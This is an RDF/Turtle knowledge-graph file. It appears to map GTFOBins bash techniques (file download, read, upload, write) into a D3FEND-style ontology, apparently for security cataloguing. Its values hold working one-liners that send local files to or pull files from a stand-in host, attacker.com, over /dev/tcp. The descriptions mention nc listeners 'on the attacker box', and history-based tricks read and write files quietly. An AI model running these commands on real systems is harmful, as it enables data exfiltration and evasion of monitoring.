mknd:command_bash-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "bash-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch a remote file via HTTP GET request.",
        "Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file." ;
    d3f:uses mknd:executable_bash ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_bash ;
    mknd:provides mknd:function_file-download ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
""",
        """export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n" 1>&3; cat 0<&3; } \\
    3<>/dev/tcp/$RHOST/$RPORT \\
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\\r")" ] && break; done; cat; } > $LFILE'
""" .

mknd:command_bash-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "bash-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "It trims trailing newlines and it's not binary-safe.",
        "The read file content is surrounded by the current history content." ;
    d3f:uses mknd:executable_bash ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_bash ;
    mknd:provides mknd:function_file-read ;
    mknd:value """LFILE=file_to_read
HISTTIMEFORMAT=$'\\r\\e[K'
history -r $LFILE
history
""",
        """export LFILE=file_to_read
bash -c 'echo "$(<$LFILE)"'
""" .

mknd:command_bash-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "bash-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
        "Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file." ;
    d3f:uses mknd:executable_bash ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_bash ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
""",
        """export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'echo -e "POST / HTTP/0.9\\n\\n$(<$LFILE)" > /dev/tcp/$RHOST/$RPORT'
""" .

mknd:command_bash-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "bash-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This adds timestamps to the output file." ;
    d3f:uses mknd:executable_bash ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_bash ;
    mknd:provides mknd:function_file-write ;
    mknd:value """LFILE=file_to_write
HISTIGNORE='history *'
history -c
DATA
history -w $LFILE
""",
        """export LFILE=file_to_write
bash -c 'echo DATA > $LFILE'
""" .

